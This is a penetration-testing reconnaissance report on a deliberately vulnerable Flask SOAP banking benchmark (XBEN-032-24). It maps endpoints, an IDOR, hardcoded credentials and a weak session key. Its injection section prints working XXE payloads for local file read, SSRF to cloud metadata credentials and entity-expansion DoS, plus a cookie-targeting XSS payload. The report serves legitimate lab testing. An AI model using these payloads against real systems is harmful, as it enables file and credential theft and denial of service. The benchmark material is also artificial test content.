# Reconnaissance Deliverable: Flask SOAP Banking Service

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of a deliberately vulnerable Flask-based SOAP web service's attack surface, with special emphasis on authorization and privilege escalation opportunities for the Authorization Analysis Specialist.

**Key Sections for Authorization Analysis:**
- **Section 4 (API Endpoint Inventory):** Contains authorization details for each endpoint - focus on "Required Role" and "Object ID Parameters" columns to identify IDOR candidates.
- **Section 6.4 (Guards Directory):** Catalog of authorization controls - understand what each guard means before analyzing vulnerabilities.
- **Section 7 (Role & Privilege Architecture):** Complete role hierarchy and privilege mapping - use this to understand the privilege lattice and identify escalation targets.
- **Section 8 (Authorization Vulnerability Candidates):** Pre-prioritized lists of endpoints for horizontal, vertical, and context-based authorization testing.

**How to Use the Network Mapping (Section 6):** The entity/flow mapping shows system boundaries and data sensitivity levels. Pay special attention to flows marked with authorization guards and entities handling PII/sensitive data.

**Priority Order for Testing:** Start with Section 8's High-priority horizontal candidates (SOAP operations with account_id), then examine the weak session management for session forgery opportunities.

## 1. Executive Summary

**Application Purpose:** This is a Flask-based SOAP web service providing banking account information queries through XML message processing. The application is a deliberately vulnerable security benchmark (XBEN-032-24) designed for penetration testing practice and security training.

**Core Technology Stack:**
- **Backend:** Python 3.8.20 (EOL) with Flask 3.0.3 web framework
- **XML Processing:** lxml 6.0.2 (etree module) with INTENTIONALLY vulnerable XXE configuration
- **Deployment:** Docker container (Podman runtime), port 80 mapped to host port 39111
- **Session Management:** Flask client-side signed cookies with hardcoded weak secret key
- **Data Storage:** In-memory Python dictionaries (no database layer)

**Primary User-Facing Components:**
1. **Login Interface** - HTML form-based authentication with hardcoded credentials
2. **Dashboard** - JavaScript-based SOAP client displaying account information
3. **SOAP Service** - XML-based API providing account data and holder information
4. **WSDL Endpoint** - Publicly accessible service documentation (unauthenticated)

**Attack Surface Summary:** The application exposes 6 HTTP endpoints on port 80 (HTTP only, no TLS). Three endpoints are unauthenticated (login, WSDL, index), two require authentication (dashboard, SOAP service), and one is publicly accessible (logout). The primary attack vectors include XML External Entity (XXE) injection in the SOAP service, session forgery via weak secret key, broken object-level authorization allowing any authenticated user to access any account data, and DOM-based XSS through unsafe innerHTML rendering. The application has zero defensive security controls: no input validation, no rate limiting, no CSRF protection, no security headers, and no audit logging.

## 2. Technology & Service Map

### Frontend
- **Framework:** HTML5 with embedded JavaScript (no modern frontend framework)
- **JavaScript Libraries:** Native fetch() API for SOAP requests
- **Template Engine:** Jinja2 3.1.6 (server-side rendering)
- **Authentication Libraries:** None (custom session-based implementation)
- **Static Assets:** Single CSS file (`/static/style.css`)

### Backend
- **Language:** Python 3.8.20 (reached end-of-life October 2024)
- **Framework:** Flask 3.0.3
- **WSGI Server:** Werkzeug 3.0.6 (development server, debug mode enabled)
- **XML Processing:** lxml 6.0.2 with etree module
- **Session Signing:** itsdangerous 2.2.0 (implicit Flask dependency)
- **SOAP Library:** zeep 4.1.0 (imported but not used)
- **HTTP Client:** requests 2.32.4 (available but not used)
- **Key Dependencies:** Flask==3.0.3, zeep==4.1.0 (from requirements.txt)

### Infrastructure
- **Hosting:** Docker container (Python:3.8-slim base image)
- **Container Runtime:** Podman (docker-compose.yml configuration)
- **Port Exposure:** 0.0.0.0:80 → host port 39111
- **CDN:** None
- **Reverse Proxy:** None (Flask application directly exposed)
- **Database Type:** None (in-memory dictionaries only)
- **Database Location:** N/A

### Identified Subdomains
From pre-reconnaissance subfinder scan:
- server02.counterintel.localhost
- autodiscover.localhost
- autodiscover.regency.localhost
- mail.regency.localhost
- www.localhost
- naeu2.naeuinc.localhost
- owa.regency.localhost
- sbs.allsaintsschool.localhost
- server2.hunter.localhost
- tools.sonoma.edu.localhost
- exchvm.nwcnet.localhost
- mail02.regency.localhost
- mail03.regency.localhost
- fndlync01.5ninesdata.localhost
- mail.localhost
- mse-ca-mail.corp.mse.localhost

**Note:** These subdomains appear to be from subfinder's default dataset and are NOT relevant to the target application at localhost:39111.

### Open Ports & Services
From nmap scan:
- **Port 80/tcp** - Caddy httpd (reverse proxy, may be redirecting to the Flask app)
- **Port 443/tcp** - ssl/https (no title/service details)
- **Port 631/tcp** - CUPS 2.3 (printing service, not application-related)
- **Port 8888/tcp** - SimpleHTTPServer (Python 3.12.10, not application-related)
- **Port 9999/tcp** - SimpleHTTPServer (Python 3.12.10, not application-related)
- **Port 49158/tcp** - Tailscale (version 1.82.5, requires authentication)

**Primary Application Port:** Port 80 redirecting to the Flask app on port 39111

## 3. Authentication & Session Management Flow

### Entry Points
- **POST /login** - Primary authentication endpoint accepting form-encoded credentials
- **GET /** - Index route that redirects authenticated users to dashboard, unauthenticated to login

### Mechanism

**Step-by-Step Authentication Process:**

1. **Initial Access (app.py:127-131)**
   - User navigates to `/` endpoint
   - Application checks for `username` key in Flask session
   - If present: redirect to `/dashboard`
   - If absent: render `login.html` template

2. **Credential Submission (login.html:10-16)**
   - User enters username and password into HTML form
   - Form submits via POST to `/login` endpoint
   - No CSRF token present in form

3. **Credential Extraction (app.py:136-137)**
   - Server extracts: `username = request.form['username']`
   - Server extracts: `password = request.form['password']`
   - **No input validation or sanitization applied**

4. **Credential Validation (app.py:138)**
   - **CRITICAL VULNERABILITY:** Plaintext password comparison
   - Code: `if username in users and users[username] == password:`
   - User database (app.py:10): `users = {'john': 'password123'}`
   - **No password hashing (bcrypt, scrypt, Argon2)**
   - **Vulnerable to timing attacks**

5. **Session Creation on Success (app.py:139-140)**
   - Sets session: `session['username'] = username`
   - Redirects to dashboard: `return redirect(url_for('dashboard'))`
   - **No session regeneration (vulnerable to session fixation)**

6. **Failure Handling (app.py:141-142)**
   - Returns: `'Invalid credentials', 401`
   - **No rate limiting (vulnerable to brute force)**
   - **No account lockout mechanism**

### Code Pointers

**Primary Authentication Files:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-032-24/app/app.py`
  - Line 7: Session secret key configuration `app.secret_key = 'your_secret_key'`
  - Line 10: Hardcoded user credentials `users = {'john': 'password123'}`
  - Lines 133-143: Login route handler
  - Lines 146-152: `@login_required` decorator implementation
  - Lines 197-200: Logout route handler

**Session Management Functions:**
- **Creation:** Line 139 - `session['username'] = username`
- **Validation:** Line 149 - `if 'username' not in session:`
- **Destruction:** Line 199 - `session.pop('username', None)`

**Templates:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-032-24/app/templates/login.html` - Login form (lines 10-16)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-032-24/app/templates/dashboard.html` - Authenticated user interface

### 3.1 Role Assignment Process

**Role Determination:** This application has NO role system. It uses a binary authentication model:
- **Unauthenticated:** No session present
- **Authenticated:** Session contains `username` key

**Default Role:** All authenticated users have equal privileges (no role differentiation)

**Role Upgrade Path:** N/A - No role hierarchy exists

**Code Implementation:** 
- No role assignment logic exists
- Session only stores username: `session['username'] = 'john'` (app.py:139)
- No role field in user database (app.py:10)

### 3.2 Privilege Storage & Validation

**Storage Location:** 
- **Session Data:** Only `username` is stored in Flask client-side signed cookie (app.py:139)
- **User Database:** In-memory dictionary with username→password mapping only (app.py:10)
- **No role/permission data stored anywhere**

**Validation Points:**
- **Single validation point:** `@login_required` decorator (app.py:146-152)
- **Check:** `if 'username' not in session:` (line 149)
- **Action on failure:** Redirect to `/login`
- **No role checks, no permission checks, no resource ownership checks**

**Cache/Session Persistence:**
- **Duration:** Flask default session lifetime (expires on browser close)
- **No explicit timeout configured**
- **No server-side session expiration**
- **Sessions persist until logout or browser close**

**Code Pointers:**
- Validation decorator: app.py lines 146-152
- Protected endpoints: app.py lines 154-157 (dashboard), 159-191 (soap_service)

### 3.3 Role Switching & Impersonation

**Impersonation Features:** NONE - No admin impersonation capability exists

**Role Switching:** N/A - No role system to switch between

**Audit Trail:** NONE - No logging of any kind (authentication, access, or errors)

**Code Implementation:** No impersonation or role switching code present in application

## 4. API Endpoint Inventory

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|-------------------------|---------------------------|
| GET | `/` | anon | None | None | Index/landing page. Checks for session and redirects authenticated users to `/dashboard`, unauthenticated to login form. See `app.py:127-131`. |
| GET, POST | `/login` | anon | None | None | Authentication endpoint. GET renders login form, POST validates credentials against hardcoded user dict. **CRITICAL:** Plaintext password comparison, no rate limiting. See `app.py:133-143`. |
| GET | `/dashboard` | user | None | Bearer Session + `@login_required` | User dashboard serving HTML with embedded JavaScript SOAP client. Automatically calls `/soap_service` on page load. See `app.py:154-157`. |
| POST | `/soap_service` | user | **account_id** (XML element) | Bearer Session + `@login_required` | **CRITICAL ENDPOINT:** SOAP service processing XML requests. Accepts `GetAccountInfoRequest` or `GetAccountHolderInfoRequest` with `account_id` parameter. **NO OWNERSHIP VALIDATION** - any authenticated user can access any account. **XXE VULNERABLE:** `resolve_entities=True` at line 164. See `app.py:159-191`. |
| GET | `/wsdl` | anon | None | None | **INFORMATION DISCLOSURE:** Publicly accessible WSDL schema endpoint exposing complete SOAP service documentation without authentication. Returns XML schema defining operations, parameters, and structure. See `app.py:193-195`. |
| GET | `/logout` | anon | None | None | Session termination endpoint. Removes `username` from session and redirects to login. **No CSRF protection.** See `app.py:197-200`. |
| GET | `/static/<filename>` | anon | filename (URL path) | None | Flask built-in static file handler serving CSS files. Referenced in templates: `style.css`. No explicit route definition (Flask automatic). |

**Network Surface Validation:** All endpoints listed above are network-accessible through the Flask web application on port 80. No local-only CLI tools, build scripts, or development utilities are present in this application.

## 5. Potential Input Vectors for Vulnerability Analysis

### URL Parameters
**None identified** - The application does not use query string parameters.

### POST Body Fields (JSON/Form)
1. **username** (Form-encoded)
   - **Endpoint:** POST `/login`
   - **Extraction:** `app.py:136` - `username = request.form['username']`
   - **Validation:** NONE
   - **Used in:** Plaintext comparison against user dictionary (line 138)
   - **Risk:** Account enumeration via timing attacks, brute force

2. **password** (Form-encoded)
   - **Endpoint:** POST `/login`
   - **Extraction:** `app.py:137` - `password = request.form['password']`
   - **Validation:** NONE
   - **Used in:** Plaintext comparison (line 138)
   - **Risk:** Brute force, credential stuffing

3. **XML POST Body** (Raw XML)
   - **Endpoint:** POST `/soap_service`
   - **Extraction:** `app.py:162` - `xml_data = request.data`
   - **Validation:** NONE
   - **Used in:** XML parser with `resolve_entities=True` (lines 164-165)
   - **Risk:** **CRITICAL XXE vulnerability** enabling file disclosure and SSRF
   - **Sub-elements extracted:**
     - `account_id` from `<GetAccountInfoRequest>` (line 168)
     - `account_id` from `<GetAccountHolderInfoRequest>` (line 178)

4. **account_id** (XML element within SOAP request)
   - **Endpoints:** POST `/soap_service` (both SOAP operations)
   - **Extraction:** `app.py:168, 178` - `account_id = root.find('.//account_id').text`
   - **Validation:** NONE
   - **Used in:** 
     - Service method calls (lines 169, 179)
     - Reflected in XML response without escaping (lines 172, 182)
     - Rendered in HTML via innerHTML (dashboard.html:48, 67)
   - **Risk:** **XSS, XML injection, IDOR**

### HTTP Headers
**No application-specific header processing identified.**
- Standard Flask/HTTP headers processed by framework
- No custom header extraction or validation
- User-Agent, X-Forwarded-For, etc. not used by application logic

### Cookie Values
1. **session** (Flask session cookie)
   - **Usage:** Authentication state storage
   - **Structure:** Signed JSON containing `{"username": "john"}`
   - **Secret Key:** `'your_secret_key'` (app.py:7) - **CRITICAL WEAKNESS**
   - **Validation:** Signature verification only (no expiration, no content validation)
   - **Risk:** Session forgery with known secret key

### File Uploads
**NONE** - No file upload functionality present in the application.

### Other User-Controllable Inputs
**None identified** - Application has minimal input surface limited to the above vectors.

## 6. Network & Interaction Map

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| External-Attacker | ExternAsset | Internet | HTTP Client | N/A | External threat actor accessing public endpoints |
| Flask-SOAP-App | Service | App | Python/Flask 3.0.3 | PII, Financial | Main application backend, single monolithic service |
| LoginEndpoint | Service | App | Flask Route | Credentials | Authentication handler, plaintext validation |
| DashboardEndpoint | Service | App | Flask Route | PII, Financial | HTML interface with SOAP client JavaScript |
| SOAPServiceEndpoint | Service | App | lxml/etree | PII, Financial | **CRITICAL:** XML processing with XXE vulnerability |
| WSDLEndpoint | Service | App | Flask Route | Public | Service documentation, no auth required |
| SessionStore | DataStore | App | Client Cookie | Auth Tokens | Flask signed cookies with weak secret key |
| UserDatabase | DataStore | App | Python Dict | Credentials | In-memory dict: `{'john': 'password123'}` |
| FlagFile | DataStore | App | Filesystem | Secrets | `/app/flag.txt` accessible via XXE |

### 6.2 Entity Metadata

| Title | Metadata |
|-------|----------|
| Flask-SOAP-App | Hosts: `http://localhost:39111`; Endpoints: `/`, `/login`, `/dashboard`, `/soap_service`, `/wsdl`, `/logout`; Auth: Session Cookie; Debug: Enabled (CRITICAL); Port: 80 (mapped to 39111); Protocol: HTTP (no TLS) |
| LoginEndpoint | Route: `/login` (GET, POST); Auth: None; Validation: Plaintext comparison; Credentials: Hardcoded `{'john': 'password123'}`; RateLimit: None; CSRF: None |
| DashboardEndpoint | Route: `/dashboard` (GET); Auth: `@login_required`; Template: `dashboard.html`; JavaScript: Auto-loads SOAP data via fetch(); XSS-Sink: innerHTML (lines 48, 67) |
| SOAPServiceEndpoint | Route: `/soap_service` (POST); Auth: `@login_required`; Parser: `lxml.etree.XMLParser(resolve_entities=True)`; Operations: GetAccountInfo, GetAccountHolderInfo; Vulnerability: XXE (line 164) |
| WSDLEndpoint | Route: `/wsdl` (GET); Auth: **NONE**; Content: Complete SOAP schema; InfoDisc: Exposes service structure publicly |
| SessionStore | Type: Client-side signed cookie; Secret: `'your_secret_key'` (weak); Algorithm: itsdangerous; Data: `{"username": "john"}`; HttpOnly: True (default); Secure: False; SameSite: None |
| UserDatabase | Storage: In-memory Python dict; Location: `app.py:10`; Format: `username:password` (plaintext); Users: Single user 'john'; Persistence: None (lost on restart) |
| FlagFile | Path: `/app/flag.txt`; Content: XBEN challenge flag; Access: File read via XXE; Injected: Docker build (Dockerfile:12-13) |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| External-Attacker → LoginEndpoint | HTTP | `:39111 /login` | None | Credentials |
| External-Attacker → WSDLEndpoint | HTTP | `:39111 /wsdl` | None | Public |
| External-Attacker → Flask-SOAP-App | HTTP | `:39111 /` | None | Public |
| Authenticated-User → DashboardEndpoint | HTTP | `:39111 /dashboard` | auth:user, session:valid | PII, Financial |
| Authenticated-User → SOAPServiceEndpoint | HTTP | `:39111 /soap_service` | auth:user, session:valid | PII, Financial |
| DashboardEndpoint → SOAPServiceEndpoint | HTTP | `POST /soap_service` | auth:user | PII, Financial |
| SOAPServiceEndpoint → UserDatabase | Internal | Memory | None | PII, Financial |
| SOAPServiceEndpoint → FlagFile | File | `file:///app/flag.txt` | **NONE (XXE)** | Secrets |
| LoginEndpoint → SessionStore | HTTP | Set-Cookie | None | Auth Tokens |
| LoginEndpoint → UserDatabase | Internal | Memory | None | Credentials |
| User Browser → SessionStore | HTTP | Cookie header | None | Auth Tokens |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| auth:user | Auth | Requires a valid user session via `@login_required` decorator. Checks for presence of `username` key in Flask session cookie. Implementation: `app.py:146-152`. |
| session:valid | Auth | Requires a cryptographically valid session cookie signed with Flask secret key. Verification performed automatically by Flask/itsdangerous. **VULNERABILITY:** Weak secret key enables forgery. |
| ownership:account | ObjectOwnership | **NOT IMPLEMENTED** - Should verify requesting user owns the target account_id. **CRITICAL IDOR VULNERABILITY:** Any authenticated user can access any account. |
| None | Network | Indicates no authentication or authorization required - endpoint is publicly accessible. |
| **NONE (XXE)** | Vulnerability | Indicates a security control that SHOULD exist but does NOT. In this case, no entity resolution restriction allows file access via XXE. |

## 7. Role & Privilege Architecture

### 7.1 Discovered Roles

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|-----------------|--------------|---------------------|
| anon | 0 | Global | No session present. Can access: `/`, `/login`, `/wsdl`, `/logout`. |
| user | 1 | Global | Session contains `username` key. Implementation: `session['username'] = 'john'` at `app.py:139`. Can access all `anon` routes plus `/dashboard` and `/soap_service`. |

**Note:** Only 2 privilege states exist - this is a binary authentication model with no role hierarchy.

### 7.2 Privilege Lattice

```
Privilege Ordering (→ means "can access resources of"):
anon → user

No Parallel Isolation exists (only linear hierarchy with 2 levels)
```

**Role Switching Mechanisms:** NONE - No impersonation, sudo mode, or role elevation features exist.

**Privilege Escalation Path:** 
- External Attacker (anon) → Authenticate with valid credentials → user
- **No vertical escalation beyond "user" role** (no admin/superuser roles)

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|---------------------------|----------------------|
| anon | `/` → redirects to login form | `/`, `/login` (GET/POST), `/wsdl`, `/logout`, `/static/*` | None |
| user | `/dashboard` | All anon routes + `/dashboard`, `/soap_service` | Session cookie (username key present) |

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|-------------------|-------------------|------------------|
| anon | None | None | No session data |
| user | `@login_required` decorator (`app.py:146-152`) | `if 'username' not in session:` redirect to login (`app.py:149`) | Session cookie: `{"username": "john"}` |

**Code References:**
- Decorator definition: `app.py:146-152`
- Applied to `/dashboard`: `app.py:155`
- Applied to `/soap_service`: `app.py:160`
- Session creation: `app.py:139`
- Session validation: `app.py:149`

## 8. Authorization Vulnerability Candidates

### 8.1 Horizontal Privilege Escalation Candidates

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity |
|----------|------------------|---------------------|-----------|-------------|
| **HIGH** | `POST /soap_service` (GetAccountInfo) | `account_id` (XML element) | financial | **CRITICAL IDOR:** Any authenticated user can query any account's balance and transaction history. No ownership validation at `app.py:168-169`. Extraction: `account_id = root.find('.//account_id').text`. Service call: `service.get_account_info(account_id)` with no authorization check. |
| **HIGH** | `POST /soap_service` (GetAccountHolderInfo) | `account_id` (XML element) | PII (name, email) | **CRITICAL IDOR:** Any authenticated user can access any account holder's personal information (name, email). No ownership validation at `app.py:178-179`. Extraction identical to GetAccountInfo operation. |

**Exploitation Details:**
1. Authenticate as user 'john' to obtain valid session cookie
2. Send SOAP request with arbitrary `account_id` value:
   ```xml
   <GetAccountInfoRequest>
       <account_id>999999</account_id>
   </GetAccountInfoRequest>
   ```
3. Server processes request without ownership validation
4. Attacker receives account data for account 999999 regardless of ownership

**Risk Assessment:** These are textbook OWASP API Security Top 10 #1 (Broken Object Level Authorization) vulnerabilities.

### 8.2 Vertical Privilege Escalation Candidates

**NONE IDENTIFIED** - The application has no administrative endpoints or elevated privilege roles.

**Explanation:** 
- No admin role exists (only binary auth/no-auth model)
- No endpoints require elevated privileges beyond basic authentication
- All authenticated users have equal access rights
- No privilege separation between different user types

**Potential Future Risks:** If the application were extended with admin functionality (user management, system configuration), the lack of RBAC would create immediate vertical escalation vulnerabilities.

### 8.3 Context-Based Authorization Candidates

**NONE IDENTIFIED** - The application has no multi-step workflows or context-dependent operations.

**Explanation:**
- No workflow state management
- No multi-step transactions (checkout, onboarding, wizards)
- All operations are single-request/response with no prior state requirements
- SOAP operations are stateless (no session-based workflow tracking)

**Note:** While the dashboard JavaScript auto-loads SOAP data, this is client-side behavior without server-side workflow enforcement.

## 9. Injection Sources (Command Injection and SQL Injection)

### Command Injection Sources

**NONE IDENTIFIED** - No command injection sources exist in this application.

**Analysis Performed:**
- Searched for: `os.system()`, `subprocess.Popen()`, `subprocess.call()`, `subprocess.run()`, `os.popen()`, `eval()`, `exec()`
- **Result:** While `os` module is imported (`app.py:4`), it is never used
- No shell command execution functions present in codebase
- No user input flows to command execution sinks

### SQL Injection Sources

**NONE IDENTIFIED** - No SQL injection sources exist in this application.

**Analysis Performed:**
- Searched for database libraries: `sqlite3`, `mysql`, `psycopg2`, `pymongo`, `sqlalchemy`
- Searched for query execution: `.execute()`, `.query()`, SQL keywords
- **Result:** No database layer exists
- All data stored in in-memory Python dictionaries
- User database: `users = {'john': 'password123'}` (line 10) - simple dict lookup
- Account data: `MyService` class returns static dictionaries (lines 19-32)

### XML External Entity (XXE) Injection Source - CRITICAL

**Injection Type:** XXE (XML External Entity) leading to File Disclosure and SSRF  
**Severity:** CRITICAL  
**Network Accessibility:** YES (requires authentication)

#### Source Location
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-032-24/app/app.py`
- **Entry Point:** Line 162 - `xml_data = request.data`
- **Vulnerable Sink:** Lines 164-165

#### Code Reference
```python
@app.route('/soap_service', methods=['POST'])
@login_required
def soap_service():
    xml_data = request.data  # Line 162: User-controlled XML input
    try:
        parser = etree.XMLParser(resolve_entities=True)  # Line 164: CRITICAL VULNERABILITY
        root = etree.fromstring(xml_data, parser)  # Line 165: Parsing with entity resolution enabled
```

#### Data Flow Path
1. **Input:** User submits POST request to `/soap_service` with XML body
2. **Extraction:** `xml_data = request.data` (line 162) - no validation
3. **Parsing:** `etree.XMLParser(resolve_entities=True)` creates vulnerable parser (line 164)
4. **Exploitation:** Parser resolves external entities (file://, http://, https://)
5. **Data Extraction:** `account_id = root.find('.//account_id').text` (lines 168, 178)
6. **Reflection:** account_id reflected in XML response (lines 172, 182)
7. **Exfiltration:** Attacker receives file contents or SSRF response

#### Validation Status
**NONE** - No input validation, no DTD restrictions, no entity resolution blocking, no XML schema validation.

#### Exploitation Scenarios

**Scenario 1: Flag File Disclosure**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<GetAccountInfoRequest>
  <account_id>&xxe;</account_id>
</GetAccountInfoRequest>
```
**Impact:** Reads `/app/flag.txt` contents (injected at Docker build, Dockerfile:12-13)

**Scenario 2: System File Access**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<GetAccountInfoRequest>
  <account_id>&xxe;</account_id>
</GetAccountInfoRequest>
```
**Impact:** Reads `/etc/passwd`, application source code, SSH keys, config files

**Scenario 3: SSRF (Server-Side Request Forgery)**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<GetAccountInfoRequest>
  <account_id>&xxe;</account_id>
</GetAccountInfoRequest>
```
**Impact:** Access AWS metadata service, retrieve IAM credentials, scan internal network

**Scenario 4: Denial of Service (Billion Laughs)**
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<GetAccountInfoRequest>
  <account_id>&lol3;</account_id>
</GetAccountInfoRequest>
```
**Impact:** Exponential entity expansion crashes application

#### Exploitability
- **Authentication Required:** YES (must have valid session cookie)
- **Complexity:** LOW (standard XXE payloads work)
- **Reliability:** HIGH (resolve_entities=True guarantees exploitation)
- **Impact:** CRITICAL (arbitrary file read, SSRF, DoS)

### Secondary Injection Vector: XML Injection via Response Reflection

**Injection Type:** XML Injection (enables XSS when rendered in browser)  
**Severity:** HIGH  
**Network Accessibility:** YES (requires authentication)

#### Source Locations
- `app.py:172` - account_id reflected in GetAccountInfoResponse
- `app.py:182` - account_id reflected in GetAccountHolderInfoResponse

#### Code Reference
```python
response_xml = f"""
<GetAccountInfoResponse>
    <account_id>{response_data['account_id']}</account_id>  # Line 172: Unsafe interpolation
    <balance>{response_data['balance']}</balance>
    ...
</GetAccountInfoResponse>
"""
```

#### Validation Status
**NONE** - No XML escaping, no output encoding, direct f-string interpolation.

#### Exploitation Chain
1. User input in `account_id` XML element
2. Extracted without validation (line 168)
3. Passed to service method (line 169)
4. Returned in response_data dictionary
5. Interpolated into XML response without escaping (line 172)
6. Returned to client
7. **Client-side XSS:** JavaScript assigns response to innerHTML (dashboard.html:48, 67)

#### Example Payload
```xml
<GetAccountInfoRequest>
    <account_id><script>alert(document.cookie)</script></account_id>
</GetAccountInfoRequest>
```

**Impact:** DOM-based XSS, session hijacking, credential theft

---

**SUMMARY FOR INJECTION SPECIALISTS:**

**Command Injection:** NO SOURCES (no shell execution in codebase)  
**SQL Injection:** NO SOURCES (no database layer)  
**XXE Injection:** 1 CRITICAL SOURCE at `/soap_service` endpoint (app.py:164-165)  
**XML Injection:** 2 HIGH sources at XML response construction (app.py:172, 182)

The primary injection attack vector is the XXE vulnerability in the SOAP service endpoint, which is the intended exploitation path for this security benchmark challenge (XBEN-032-24).